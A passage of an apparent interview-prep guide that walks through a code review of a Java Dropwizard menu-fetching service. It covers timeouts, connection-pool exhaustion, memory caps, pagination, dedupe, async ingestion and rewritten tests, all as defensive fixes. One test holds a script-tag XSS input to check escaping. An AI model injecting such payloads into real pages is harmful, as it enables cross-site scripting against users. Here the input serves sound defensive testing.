</details>
<details><summary>Doesn't the GC close it eventually?</summary>

Maybe, sometimes, via a cleaner. But GC is driven by heap pressure, not FD pressure: you can run out of 1024 FDs with a mostly empty heap. Never rely on GC for non-memory resources.
</details>
<details><summary>`disconnect()` vs closing the stream?</summary>

Closing the stream lets `HttpURLConnection` return the socket to its keep-alive cache for reuse. `disconnect()` signals that we won't reuse it and closes it. For untrusted hosts you call each fetch once, so `disconnect` is fine; for a hot partner API you'd prefer pooling (Apache HttpClient / OkHttp with a connection pool).
</details>

---

### 🔴 R2: No timeouts → thread exhaustion (line 116)

**Say it:**
> "There are **no connect or read timeouts**, and the JDK default is infinite. An attacker, or just a slow server, can accept the connection and never send a byte, and our Jetty request thread blocks forever. Jetty has a bounded thread pool, about 200 threads by default in Dropwizard (`maxThreads`), so a couple of hundred slow URLs **take down the whole service**, including endpoints that have nothing to do with fetching, like health checks. That's a P0/P1 availability issue, and it's trivially exploitable. Fix: connect timeout ~2s, read timeout ~5s, a **total deadline**, because a per-read timeout doesn't stop a server that drips one byte every 4 seconds, and a bulkhead semaphore so fetches can only use a fraction of the threads."

```java
conn.setConnectTimeout(2_000);
conn.setReadTimeout(5_000);                         // max gap between packets
Instant deadline = Instant.now().plus(Duration.ofSeconds(15));   // total budget, checked in the read loop

if (!fetchPermits.tryAcquire()) throw new ServiceUnavailableException(5L);   // bulkhead → 503 Retry-After
try { content = source.fetch(locator); } finally { fetchPermits.release(); }
```

**Follow-up questions:**
<details><summary>How do you choose timeout values?</summary>

From data: the upstream's p99 latency plus headroom, and the caller's own budget (if our client times out at 30s, our fetch must finish well before that). Start with connect 1–2s (a TCP handshake is ms; a long connect means the host is unreachable), read 5s, total 10–15s. Make them configurable and measure.
</details>
<details><summary>Why isn't the read timeout enough? (slowloris)</summary>

`setReadTimeout` bounds the gap between *individual* reads. A server sending 1 byte every 4 seconds never trips a 5-second read timeout, and a 1 MB body would take 46 days. The total deadline catches that.
</details>
<details><summary>Should you retry on timeout?</summary>

Not inside the request thread: it multiplies the time threads are held. In an async worker, retry with exponential backoff + jitter, a max attempt count and a retry budget, and only for idempotent operations (a GET fetch is). Add a per-host **circuit breaker** (Resilience4j) so a dead host fails fast instead of eating timeouts.
</details>
<details><summary>What's a bulkhead and why a semaphore with `tryAcquire`?</summary>

It isolates one dependency's failures from the rest of the service: fetches can hold at most N threads, so the other ~180 keep serving. `tryAcquire()` (non-blocking) fails fast with 503 instead of making requests queue for a permit, which would just move the thread starvation somewhere else.
</details>

---

### 🔴 R3: DB connection held during the network fetch (line 65)

**Say it:**
> "This one's subtle. `loadUrl` is annotated `@UnitOfWork`, and Dropwizard opens the Hibernate session and **begins a transaction before the method runs**, which checks a connection out of the pool. Then the method spends seconds, or forever (R2), fetching a URL while holding that DB connection. The DB pool is small, around 8–32 connections. So with a pool of 10 and fetches taking 10 seconds, at 1 request per second the pool is drained, and *every* endpoint in the service that touches the DB starts timing out waiting for a connection. It's an outage caused by a slow third-party site. The root cause is that the transaction scope is too wide: it wraps I/O that doesn't need the DB. Fix: fetch **without** a unit of work, then persist in a short separate transaction. In Dropwizard you do that by putting `@UnitOfWork` on a service method and creating it with `UnitOfWorkAwareProxyFactory`."

```java
@POST                                   // NO @UnitOfWork here
public Response create(@Valid CreateMenuSourceRequest req, @Context UriInfo uriInfo) {
    FetchedContent content = source.fetch(req.getLocation());       // seconds, no DB connection held
    MenuData saved = service.save(req.getLocation(), content);       // milliseconds, own transaction
    ...
}

public static class MenuDataService {
    @UnitOfWork
    public MenuData save(String locator, FetchedContent content) { ... }
}
// wiring:
MenuDataService service = new UnitOfWorkAwareProxyFactory(hibernateBundle)
        .create(MenuDataService.class, MenuDataDAO.class, dao);
```

**Follow-up questions:**
<details><summary>Do the math: when does the pool run out?</summary>

Little's law: connections in use = arrival rate × time held. Pool = 10, fetch = 10s → it saturates at 1 req/s. After the fix: hold time ≈ 10ms → the same pool handles ~1000 req/s.
</details>
<details><summary>Why does UnitOfWorkAwareProxyFactory exist?</summary>

`@UnitOfWork` is implemented by a Jersey event listener, so it only works on resource methods invoked by Jersey. For any other object, the factory creates a ByteBuddy proxy subclass that opens/closes the session around annotated methods. Gotchas: the class and methods can't be final, and self-invocation (`this.save()`) bypasses the proxy.
</details>
<details><summary>How does Hibernate know a connection isn't needed yet? Isn't it lazy?</summary>

The connection is acquired when the transaction begins (connection handling mode), and `@UnitOfWork` begins the transaction at method start. Some configurations delay acquisition, but you shouldn't rely on that, and once anything touches the session the connection stays held until commit.
</details>

---

### 🔴 R4: Unbounded reads → OutOfMemoryError (lines 112, 118–129)

**Say it:**
> "Neither path limits size. `Files.readAllBytes` on `/dev/zero` never ends, and a URL serving a 2 GB file gets read fully into a `ByteArrayOutputStream`. The BAOS grows by doubling its internal array, so each grow copies everything, and `toByteArray()` makes **another full copy**: peak memory is about 2–3× the payload, *per concurrent request*. A few concurrent large downloads → `OutOfMemoryError` → the JVM is dead or thrashing in GC for every user. Also, arrays over 2 GB can't exist at all. Fix: a hard size cap enforced **while reading**, plus an early reject on `Content-Length`. Long term, stream straight to object storage without buffering."

```java
long declared = conn.getContentLengthLong();
if (declared > maxBytes) throw new MenuFetchException(TOO_LARGE, "declared " + declared);   // cheap, but can lie

static byte[] readAtMost(InputStream in, int maxBytes, Instant deadline) throws IOException {
    ByteArrayOutputStream out = new ByteArrayOutputStream(Math.min(maxBytes, 64 * 1024));
    byte[] buf = new byte[16 * 1024];
    int n;
    while ((n = in.read(buf)) != -1) {
        if (out.size() + n > maxBytes) throw new MenuFetchException(TOO_LARGE, "more than " + maxBytes);
        if (deadline != null && Instant.now().isAfter(deadline)) throw new MenuFetchException(TIMEOUT, "deadline");
        out.write(buf, 0, n);
    }
    return out.toByteArray();
}
// one-liner alternative: byte[] b = in.readNBytes(maxBytes + 1); if (b.length > maxBytes) → 413
```

**Follow-up questions:**
<details><summary>Why `readNBytes(MAX + 1)` and not `readNBytes(MAX)`?</summary>

With exactly MAX you can't tell "the file is exactly MAX bytes" from "the file is bigger and got cut off". Reading one extra byte disambiguates; if you got MAX+1, it's too large.
</details>
<details><summary>Why check `Content-Length` if you enforce while reading anyway?</summary>

To reject early without downloading anything. But it's optional (chunked encoding has none) and the server can lie, so it's an optimisation, never the guard.
</details>
<details><summary>How would you stream to S3 without holding the file in memory?</summary>

Pipe the input stream into an S3 multipart upload (e.g. 8 MB parts, so memory = one part) while wrapping the stream in a `DigestInputStream` to compute the SHA-256 on the fly, and count bytes to enforce the cap. Memory stays constant regardless of file size.
</details>
<details><summary>How would you size the cap?</summary>

Look at real data: menus are typically KBs to a few MB (PDFs with images maybe 10–20 MB). Pick a cap above p99.9 (say 10 MB), make it configurable, and track the 413 rate to see if legit menus hit it. Memory budget: cap × max concurrent fetches (the bulkhead) must fit comfortably in the heap.
</details>
<details><summary>What would you see in production before the OOM?</summary>

GC pauses getting longer, old-gen usage climbing, latency spikes for all endpoints, then `java.lang.OutOfMemoryError: Java heap space` and a restart loop. Use `-XX:+HeapDumpOnOutOfMemoryError` and look for huge `byte[]` instances.
</details>

---

### 🟠 P1: `findAll()` loads every blob (lines 82, 254–257)

**Say it:**
> "`list()` calls `findAll()`, which is `SELECT d FROM MenuData d`, with no limit, and loads **full entities including the blob column**, just to print the id and locator. With 100k menus at 1 MB each, that's 100 GB pulled from the DB for one page view; it OOMs long before that. Every entity also stays in the Hibernate session's first-level cache until the request ends, so nothing can be GC'd mid-loop. Each page load gets slower as the table grows. Fix: a **projection** that selects only the needed columns, plus **keyset pagination**."

```java
public List<MenuSummary> findSummaries(long afterId, int limit) {
    return currentSession()
        .createQuery("SELECT new com.toasttab.menu.MenuSummary(d.id, d.locator, d.contentType, d.sizeBytes, d.fetchedAt)"
                   + " FROM MenuData d WHERE d.id > :afterId ORDER BY d.id", MenuSummary.class)
        .setParameter("afterId", afterId)
        .setMaxResults(limit)
        .list();
}
// response: { "items": [...], "nextAfterId": 1234 }   (null on the last page)
```

**Follow-up questions:**
<details><summary>Keyset vs OFFSET pagination?</summary>

`OFFSET 100000 LIMIT 50` makes the DB read and discard 100k rows, so deep pages get linearly slower, and inserts/deletes during paging cause skipped or duplicated rows. Keyset (`WHERE id > :last ORDER BY id LIMIT 50`) seeks via the index: constant cost per page and stable. The trade-off: you can't jump to page 37, only next/previous.
</details>
<details><summary>What if they want to sort by fetchedAt instead of id?</summary>

Keyset on a composite key to break ties: `WHERE (fetched_at, id) > (:lastTs, :lastId) ORDER BY fetched_at, id`, with an index on `(fetched_at, id)`. The cursor is encoded as an opaque token.
</details>
<details><summary>Should the response include a total count?</summary>

`COUNT(*)` on a big table is expensive on every page (especially Postgres/InnoDB). Avoid it, cache it, or return an estimate. Most UIs only need "has more".
</details>
<details><summary>Other ways to avoid loading the blob?</summary>

(1) The projection (chosen). (2) A separate `MenuContent` entity/table with a lazy `@OneToOne`/`@MapsId`. (3) `@Basic(fetch = LAZY)` + bytecode enhancement. (4) Best: the blob isn't in the DB at all (S3, D2).
</details>

---

### 🟡 P2: Read endpoints use read-write transactions (lines 78, 95)

**Say it:**
> "`list()` and `get()` use plain `@UnitOfWork`. Use `@UnitOfWork(readOnly = true)`: Hibernate sets the session to read-only (no dirty checking, no snapshot copies of loaded entities, which for blob entities halves the memory), and the JDBC connection can be marked read-only so the driver/DB can optimise or route to a replica."

---

### 🟡 P3: No dedupe (lines 142–148)

**Say it:**
> "Loading the same URL twice stores two identical blobs. Clients retrying, or crawlers hitting the GET endpoints, multiply storage. The downstream 'most popular dish in Boston' job also **double-counts** duplicate menus, so it's a data-quality bug, not just storage. Fix: hash the content (SHA-256), put a unique constraint on the hash, and return the existing row on a duplicate."

```java
@Table(name = "MENU_SOURCE",
       uniqueConstraints = @UniqueConstraint(name = "UK_MENU_SOURCE_SHA256", columnNames = "CONTENT_SHA256"))

@UnitOfWork
public MenuData save(String locator, FetchedContent content) {
    return dao.findByContentHash(content.getSha256())
              .orElseGet(() -> dao.create(new MenuData(locator, content, Instant.now())));
}
```

**Follow-up questions:**
<details><summary>Two requests insert the same content at the same time. What happens?</summary>

Both see "not found", both insert, and the unique constraint rejects one, which gets a 500 unless handled. Handle it: catch the constraint violation and re-read the existing row, or use the DB's upsert (`INSERT ... ON CONFLICT (content_sha256) DO NOTHING RETURNING id` in Postgres, `INSERT IGNORE` in MySQL). The **constraint is the real guard**; the lookup is just the fast path.
</details>
<details><summary>Dedupe by content or by locator?</summary>

By content: the same menu mirrored at two URLs is one menu for analytics. If you need history ("this restaurant's menu changed"), keep a version per locator: `(locator_hash, content_hash)` unique, plus `fetched_at`. Note: you can't put a unique index on a 2048-char column in MySQL InnoDB (key length limit), so hash the locator.
</details>
<details><summary>Why SHA-256 and not hashCode / MD5?</summary>

`hashCode` is 32 bits, so collisions are guaranteed at scale. MD5/SHA-1 collisions can be crafted deliberately (an attacker could make their content "replace" another). SHA-256 is fast enough and collision-resistant.
</details>

---

### 🟡 P4: String concatenation inside `StringBuilder` (line 85)

> "Minor: `html.append(a + b + c)` builds a temporary String first, which defeats the point of the StringBuilder. Chain `.append(a).append(b)`. The real fix is a template engine anyway (S3)."

---

### 🔵 D1: Static `Reader` + `switch` → Strategy pattern (lines 39–41, 105–140)

**Say it:**
> "`Reader` is a static method with a `switch` on an enum. It can't be mocked, so the resource can't be unit tested without real files and network, and adding a source like S3 or FTP means editing this switch, which violates open/closed. I'd define a `MenuSource` interface with `UrlMenuSource` and `FileMenuSource` implementations, injected through the constructor as a `Map<SourceType, MenuSource>`."

```java
public interface MenuSource { FetchedContent fetch(String locator); }
public static class UrlMenuSource implements MenuSource { ... }
public static class FileMenuSource implements MenuSource { ... }

// resource
private final Map<SourceType, MenuSource> sources;      // injected
MenuSource source = sources.get(request.getType());
```

<details><summary>Follow-up: how do you add an S3 source now?</summary>

Write `S3MenuSource implements MenuSource`, add `S3` to the enum, register it in the wiring. The resource doesn't change at all. In tests, inject a fake `MenuSource` that returns fixed bytes or throws.
</details>

---

### 🔵 D2: Blobs in the database → object storage

**Say it:**
> "Storing raw menu files in a relational table bloats the DB: backups, replication and buffer pool all carry the blobs, and DB storage is the most expensive storage we have. I'd store the file in S3, keyed by content hash (which gives free dedupe), and keep only metadata in the DB: locator, content type, size, hash, S3 key, fetchedAt, restaurant. `GET content` becomes a redirect to a short-lived pre-signed URL, so the bytes never pass through our JVM."

<details><summary>Follow-up: how do you keep S3 and the DB consistent?</summary>

Write to S3 first, then the DB row. If the DB write fails, you have an orphan object, which is harmless and cleaned up by a lifecycle rule or a sweeper. Never the other order (a DB row pointing at a missing object). With content-addressed keys, retries are naturally idempotent.
</details>

---

### 🔵 D3: Synchronous fetch → async job

**Say it:**
> "Even with timeouts, a 15-second fetch inside an HTTP request is fragile. The client's own timeout may be shorter, and the load balancer might cut it off. For 'gather all the menus in the world' scale I'd make ingestion asynchronous: `POST` returns `202 Accepted` with a job id, a worker pool does the fetch with retries and per-host rate limits, and the client polls `GET /jobs/{id}` or gets a webhook."

```java
@POST
public Response submit(@Valid CreateMenuSourceRequest req) {
    long jobId = jobs.enqueue(req);                       // INSERT INTO fetch_job (status=PENDING) or publish to SQS
    return Response.accepted(new JobRef(jobId))
                   .location(URI.create("/jobs/" + jobId)).build();
}

// worker (separate thread pool / service)
void process(FetchJob job) {
    try {
        FetchedContent c = sources.get(job.type()).fetch(job.locator());
        service.save(job.locator(), c);
        jobs.markDone(job.id());
    } catch (MenuFetchException e) {
        if (isRetryable(e) && job.attempts() < 5) jobs.retryLater(job.id(), backoffWithJitter(job.attempts()));
        else jobs.markFailed(job.id(), e.getKind());
    }
}
```

**Follow-up questions:**
<details><summary>Which queue would you use?</summary>

For modest volume, a DB-backed job table (`SELECT ... FOR UPDATE SKIP LOCKED`) is simple and transactional. At larger scale, SQS (visibility timeout = built-in retry, DLQ for poison messages) or Kafka if other consumers need the event stream. Mention the **transactional outbox** if the job must be published atomically with a DB write.
</details>
<details><summary>Exactly-once processing?</summary>

Queues give at-least-once. Make the consumer idempotent: the content-hash unique constraint (P3) means processing the same job twice stores one row.
</details>
<details><summary>Backpressure when the queue grows?</summary>

Bounded queue / max pending jobs per client; when full, return `429 Too Many Requests` or `503` with `Retry-After`. Scale workers on queue depth. Per-destination-host limits so we're polite to the restaurant sites.
</details>

---

### 🔵 D4: Code hygiene (lines 106, 142, 164, 254–257)

- `org.hibernate.Query` is raw and deprecated, with an unchecked cast `(List<MenuData>)`. Use `createQuery(hql, MenuData.class)`, which is typed.
- `private static Logger logger` is JUL and not `final`. Dropwizard uses Logback, so use `private static final Logger LOG = LoggerFactory.getLogger(...)` (slf4j).
- `loadByes` → `loadBytes`; table `RETRIEVED_DATA` → `MENU_SOURCE` (domain naming).
- Unused imports (`java.io.File`); `default: "cannot happen"` is fine but a sign the switch should be polymorphism (D1).
- The class-level `@Produces(TEXT_PLAIN)` doesn't match the HTML and bytes endpoints.

### 🔵 D5: "By any means necessary" (Javadoc)

> "Worth flagging at the product level: scraping 'by any means necessary' raises legal and ToS issues. I'd respect `robots.txt`, send an identifying `User-Agent` with a contact URL, rate limit per host, and prefer partner APIs/feeds where they exist."

---

### 🧪 Tests: `ReaderTest` (lines 273–283)

**Say it:**
> "The tests have a few problems. First, **it doesn't compile**: `StandardCharsets` isn't imported, and `MenuDataResource` is referenced but only the nested classes are imported. Second, it calls the real `http://www.example.com`, so it's slow, flaky in CI, and fails offline. Third, the temp file is never deleted. Fourth, `"SomeText".getBytes()` uses the platform default charset while the assertion decodes as UTF-8. And it tests two unrelated things in one method, with **no negative cases at all**: nothing covers the null return, 404, validation, size limits, timeouts, SSRF, path traversal or XSS escaping. The resource and DAO aren't tested at all."

**T1: file reading, with cleanup and charset:**
```java
@Test
void readsFileInsideImportDir(@TempDir Path dir) throws IOException {   // JUnit 5 deletes it
    Files.writeString(dir.resolve("menu.txt"), "SomeText", StandardCharsets.UTF_8);
    FetchedContent c = new FileMenuSource(dir, 1024).fetch("menu.txt");
    assertEquals("SomeText", new String(c.getBytes(), StandardCharsets.UTF_8));
}
```

**T2: URL fetching against a local fake server (WireMock), not the internet:**
```java
@RegisterExtension
static WireMockExtension wm = WireMockExtension.newInstance().options(wireMockConfig().dynamicPort()).build();

UrlMenuSource source = new UrlMenuSource(InetAddress::isLoopbackAddress, 1024);   // test policy

@Test void fetchesBody() {
    wm.stubFor(get("/menu").willReturn(ok("burger 10").withHeader("Content-Type", "text/plain")));
    assertEquals("burger 10", new String(source.fetch(wm.url("/menu")).getBytes(), UTF_8));
}
@Test void rejectsOversizedBody() {
    wm.stubFor(get("/big").willReturn(ok().withBody(new byte[2048])));
    assertEquals(Kind.TOO_LARGE, assertThrows(MenuFetchException.class, () -> source.fetch(wm.url("/big"))).getKind());
}
@Test void timesOutOnSlowServer() {
    wm.stubFor(get("/slow").willReturn(ok("x").withFixedDelay(10_000)));
    assertEquals(Kind.TIMEOUT, assertThrows(MenuFetchException.class, () -> source.fetch(wm.url("/slow"))).getKind());
}
@Test void maps404To502() {
    wm.stubFor(get("/gone").willReturn(notFound()));
    assertEquals(Kind.UPSTREAM_FAILED, assertThrows(MenuFetchException.class, () -> source.fetch(wm.url("/gone"))).getKind());
}
```

**T3: resource tests with Dropwizard's `ResourceExtension` (mocked dependencies):**
```java
MenuDataDAO dao = mock(MenuDataDAO.class);
ResourceExtension resources = ResourceExtension.builder()
        .addResource(new MenuSourceResource(Map.of(SourceType.URL, fakeSource), service, dao, 10))
        .addProvider(new MenuFetchExceptionMapper()).build();

@Test void unknownIdIs404() {
    when(dao.findById(42L)).thenReturn(Optional.empty());
    assertEquals(404, resources.target("/menu-sources/42/content").request().get().getStatus());
}
@Test void listEscapesHtml() {
    when(dao.findSummaries(0, 50)).thenReturn(List.of(new MenuSummary(1L, "<script>x</script>", "text/html", 1, Instant.now())));
    String html = resources.target("/menu-sources").request(MediaType.TEXT_HTML).get(String.class);
    assertFalse(html.contains("<script>"));
    assertTrue(html.contains("&lt;script&gt;"));
}
@Test void blankLocationIs422() {
    Response r = resources.target("/menu-sources").request()
            .post(Entity.json("{\"type\":\"URL\",\"location\":\"  \"}"));
    assertEquals(422, r.getStatus());
}
```

**T4: DAO tests with `DAOTestExtension` (H2 in-memory) or Testcontainers (real Postgres/MySQL, catches dialect issues like `@Lob`):**
```java
@Test void summariesArePagedById() {
    for (int i = 0; i < 5; i++) daoTest.inTransaction(() -> dao.create(menu("u" + i)));
    List<MenuSummary> p1 = dao.findSummaries(0, 2);
    List<MenuSummary> p2 = dao.findSummaries(p1.get(1).getId(), 2);
    assertEquals(2, p2.size());
    assertTrue(p2.get(0).getId() > p1.get(1).getId());
}
@Test void storesLargeBlob() {   // would fail with VARBINARY(255): proves @Lob
    MenuData m = daoTest.inTransaction(() -> dao.create(menuOfSize(1_000_000)));
    assertEquals(1_000_000, dao.findById(m.getId()).get().getBytes().length);
}
```

<details><summary>Follow-up: H2 or Testcontainers for DAO tests?</summary>

H2 is fast but not your production DB: dialect differences (e.g. `@Lob`/`oid` on Postgres, unique index length on MySQL, upsert syntax) slip through. Testcontainers runs the real DB in Docker; it's slower but catches those. A common split: H2 for quick unit-level DAO tests, Testcontainers in CI integration tests.
</details>

---

## 6. Cross-cutting follow-up questions (the interviewer zooms out)

<details><summary>"You found ~25 issues. You have one day. What do you fix first?"</summary>

1. Kill or lock down `loadFile` and `loadUrl` (S1/S2): an active breach risk, and it's a config/flag change. 2. Timeouts + try-with-resources + size cap (R1/R2/R4): one small, low-risk PR that prevents outages. 3. Move the fetch out of `@UnitOfWork` (R3). 4. `@Lob` + null handling (C7/C1): data corruption. Then XSS, pagination, and the rest as follow-up tickets. **Security and availability before performance and style.**
</details>
<details><summary>"How would you have caught these before production?"</summary>

A secure-coding checklist in PR review (user input reaching file/URL/HTML/SQL sinks); static analysis (SpotBugs + FindSecBugs flags path traversal, SSRF, XSS, unclosed streams); DAST/pentest on public endpoints; load tests with slow upstreams (toxiproxy) to catch R2/R3; a threat model for any endpoint that fetches user-supplied resources.
</details>
<details><summary>"How would you monitor this service after the fix?"</summary>

RED metrics per endpoint (rate, errors by status code, latency p50/p99); fetch-specific counters by `MenuFetchException.Kind` (a spike in INVALID_LOCATOR may mean someone is probing SSRF); bulkhead rejections (503s); DB pool active/pending connections; JVM heap and GC; open FDs. Alerts on 5xx rate and pool saturation.
</details>
<details><summary>"Is your fixed version thread-safe?"</summary>

Yes. The resource is a singleton holding only immutable/thread-safe fields (`EnumMap` built once and never mutated, a `Semaphore`, a DAO that uses the per-thread current session). The sources hold only immutable configuration, and each fetch creates its own connection. There's no shared mutable state.
</details>
<details><summary>"What's the memory footprint per request now?"</summary>

At most maxBytes (cap) for the body, plus one copy from `toByteArray`, plus Hibernate's handling during insert. Bounded by cap × bulkhead permits. With S3 streaming, it's one multipart chunk per request.
</details>
<details><summary>"How would this scale to millions of menus?"</summary>

Async ingestion with a queue and horizontally scaled workers; blobs in S3 (content-addressed); metadata in the DB with indexes on `(restaurant_id)`, `(fetched_at, id)`; keyset pagination; per-host politeness limits; the downstream analytics job reads from S3/a data lake, not the OLTP DB.
</details>
<details><summary>"Why Dropwizard `@UnitOfWork` at all? What's the alternative?"</summary>

It's the idiomatic Dropwizard way to scope a session per request. Alternatives: explicit `sessionFactory.inTransaction(...)` blocks (clearer scope, more boilerplate), or Spring's `@Transactional` in a Spring app. The principle is the same either way: keep transactions short and around DB work only.
</details>

---

## 7. What the fixed design looks like (draw this)

```
Client ──POST /menu-sources {type, location}──► [Auth + rate limit (gateway)]
                                                        │
                                                        ▼
                                         MenuSourceResource (no transaction)
                                           │ validate DTO (422)
                                           │ bulkhead permit (else 503)
                                           ▼
                                   MenuSource (Strategy)
                         ┌─────────────────┴──────────────────┐
                 UrlMenuSource                          FileMenuSource
           scheme/port/IP check per hop               import dir only,
           timeouts + deadline, size cap              toRealPath + startsWith
           try-with-resources                         size cap
                         └─────────────────┬──────────────────┘
                                           ▼  FetchedContent(bytes, type, sha256)
                         MenuDataService.save()  ← short @UnitOfWork
                           dedupe by sha256 (unique constraint)
                                           ▼
                                  201 Created + Location

GET /menu-sources?afterId&limit  → projection + keyset, JSON, readOnly
GET /menu-sources/{id}/content   → 404 if missing, real content type, nosniff
```

---

## 8. Generic checklist (works for any code-review question)

- **Input:** validated? null / blank / huge / malicious? path traversal? injection (SQL / HTML / log / command)?
- **Trust:** authN / authZ? rate limit? SSRF? Does a GET change state?
- **Errors:** swallowed? `return null`? correct HTTP status? dead branches?
- **Resources:** streams / connections closed (try-with-resources)? timeouts? pools held during slow I/O?
- **Memory:** unbounded reads? load-all queries? large objects retained? extra copies?
- **DB:** N+1? `SELECT *` with blobs? pagination? indexes / unique constraints? transaction scope?
- **Entity:** `equals`/`hashCode` (arrays, generated ids)? column types / lengths? nullability?
- **Concurrency:** shared mutable state? non-thread-safe statics? check-then-act races?
- **Design:** single responsibility? testable (statics, `new` inside methods)? open/closed (switch on type)?
- **Tests:** real network? cleanup? charset? negative cases? does it even compile?

---

## 9. Mock interview script (60 min, do it with a timer)

1. **(0–5)** Say your clarifying questions from §1 out loud. Pretend answers: *public, menus up to 10 MB, millions of rows, consumed by an internal analytics service.*
2. **(5–10)** State your plan in one sentence.
3. **(10–20)** Walk `loadFile` and `loadUrl`. Narrate S1, S2, R1, R2, R3, R4, C1, C2, S5 using the 6 beats.
4. **(20–28)** Walk `list()` and `get()`. Narrate S3, P1, P2, C3, C5, C9.
5. **(28–35)** Entity + DAO: C6, C7, C8, P3, D4.
6. **(35–40)** Tests: T1–T4.
7. **(40–50)** Design: D1, D2, D3. Draw §7.
8. **(50–55)** Top-5 recap (§10).
9. **(55–60)** Pick 3 random `<details>` questions from §5/§6 and answer them without peeking.

**Self-grading rubric:**
| Area | Strong signal |
|---|---|
| Prioritisation | Opened with S1/S2; ranked explicitly |
| RCA depth | Gave the *root cause* (trust boundary, transaction scope), not just the symptom |
| Impact | Quantified (pool math, 2–3× memory, blast radius) |
| Fixes | Concrete code, plus short-term vs long-term |
| Breadth | Covered security, correctness, reliability, performance, design, tests |
| Communication | Calm structure, asked questions, checked in with the interviewer |

---

## 10. Closing summary (memorise)

**30 seconds:**
1. **Security:** arbitrary file read + SSRF (both with an exfiltration channel via `GET /{id}`), stored XSS, no auth, state change on GET.
2. **Reliability:** unclosed streams, no timeouts, and a DB connection held during network I/O → thread and DB-pool exhaustion → service-wide outage.
3. **Memory:** unbounded reads (2–3× peak) and `findAll` pulling every blob → OOM.
4. **Correctness:** null swallowed → constraint failure, always "success", 404 → 500, broken `equals`/`hashCode`, missing `@Lob` truncates data.
5. **Design:** Strategy for sources, short transactions, async ingestion, blobs in S3, projection + keyset pagination, real tests with WireMock.

**2 minutes:** say each of the 5 points above with one concrete example + its fix, then end with: *"If I had one day, I'd lock down the two load endpoints first, then ship timeouts, try-with-resources and a size cap together, then shrink the transaction scope."*
